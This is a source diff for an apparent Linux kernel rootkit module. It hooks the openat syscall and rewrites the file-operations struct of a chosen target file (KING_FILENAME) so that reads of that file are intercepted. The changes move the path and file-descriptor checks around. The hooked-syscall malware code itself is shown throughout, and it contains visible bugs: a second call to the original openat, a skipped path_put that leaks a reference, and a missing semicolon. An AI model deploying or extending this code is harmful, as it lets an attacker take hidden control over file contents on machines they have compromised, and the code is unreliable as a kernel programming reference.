@@ -73,7 +73,21 @@ static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff
     }
 }
 
+/* Checks if path doesn't match KING_FILENAME and return immediately*/
+static long is_bad_path(const char *full_path) {
+    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) != 0) {
+        return 1;
+    }
+    return 0;
+}
 
+/* Checks if file descriptor (fd) is standard (STDOUT, STDERR, STDIN)*/
+static long is_bad_fd(const int fd) {
+    if (fd < 3) { // 0, 1, 2
+        return 1;
+    }
+    return 0;
+}
 /* 
 Chains kern_path and d_path to resolve the final filename from a path (filename) is pointing to. 
 WARNING: Callers should use full_path, not resolved_path, to use the name! 
@@ -93,10 +107,16 @@ static long resolve_filename(const char __user *filename, char *resolved_path, c
     if (error) {
         return error;
     }
+
     *full_path = d_path(&path, resolved_path, PATH_MAX);
     if (IS_ERR(*full_path)) {
         path_put(&path);
         return PTR_ERR(*full_path);
+    }
+
+    error = is_bad_path(*full_path); // check if full_path matches KING_FILENAME
+    if (error) {
+        return error; 
     }
 
     path_put(&path);
@@ -105,21 +125,9 @@ static long resolve_filename(const char __user *filename, char *resolved_path, c
     return 0;
 }
 
-/* Checks if path doesn't match KING_FILENAME or if fd is standard and return immediately */
-static long is_bad_fd(int fd, const char *full_path) {
-    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) != 0 || fd < 3) {
-        return fd;
-    }
-    return 0;
-}
-
 /* Poisons the file operations structures of given fd to use hook_read as the read syscall */
 static long handle_fops_poisoning(int fd, const char *full_path) {
     struct file *file;
-
-    if (is_bad_fd(fd, full_path) != 0) {
-        return -1; // Signal to call orig_openat
-    }
 
     file = fget(fd);
     if (!file) {
@@ -188,12 +196,20 @@ static asmlinkage long hook_openat(const struct pt_regs *regs)
         kfree(resolved_path) // free resolved_path
         return orig_openat(regs);
     }
-    /* poison fops sturct if fd corresponds to our target file */
+    /* poison fops sturct if path matches our target file and fd is not standard */
     fd = orig_openat(regs);
+
+    error = is_bad_fd(fd); // check if fd is not standard
+    if (error) {
+        kfree(resolved_path);
+        return orig_openat(regs);
+    }
+
     error = handle_fops_poisoning(fd, full_path);
     if (error == fd) { // fops poisoning succeeded 
         return fd;
     }
+    kfree(resolved_path);
     return orig_openat(regs);
 }
 #else
@@ -218,8 +234,15 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
         kfree(resolved_path); // free resolved_path
         return orig_openat(dfd, filename, flags, mode);
     }
-    /* poison fops sturct if fd corresponds to our target file */
-    fd = orig_openat(dfd, filename, flags, mode);
+    /* poison file operations of our new file descriptor */
+    fd = orig_openat(dfd, filename, flags, mode); 
+    
+    error = is_bad_fd(fd); // check if fd is not standard
+    if (error) {
+        kfree(resolved_path);
+        return orig_openat(dfd, filename, flags, mode);
+    }
+
     error = handle_fops_poisoning(fd, full_path);
     if (error == fd) { // fops poisoning succeeded 
         return fd;
